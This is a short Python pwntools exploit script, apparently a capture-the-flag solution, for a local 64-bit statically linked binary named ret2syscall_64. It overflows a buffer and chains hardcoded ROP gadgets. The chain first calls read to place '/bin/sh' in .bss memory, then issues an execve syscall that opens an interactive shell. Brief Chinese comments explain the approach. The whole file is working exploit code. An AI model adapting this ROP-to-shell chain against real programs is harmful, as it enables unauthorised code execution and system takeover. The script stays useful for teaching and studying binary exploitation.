from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./ret2syscall_64')
elf = ELF('./ret2syscall_64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset=0x10
pop_rax_ret = 0x449117
pop_rdi_ret = 0x4018c2
pop_rsi_ret = 0x40f21e
pop_rdx_ret = 0x4017cf
ret = 0x40101a
buf = 0x4C22EA
syscall = 0x4012d3
# 由于程序中找不到/bin/sh字符串，所以我们先在IDA中找一段.bss段的内存，当作buf再调用read,输入/bin/sh

payload = b'a'*offset + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(8) + p64(elf.sym['read'])

# 静态链接没有system函数地址，但是有syscall需要构造shellcode和系统调用号0x3b
payload += p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(buf) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall)
p.sendline(payload)
sleep(1)
p.send(b'/bin/sh\x00')

p.interactive()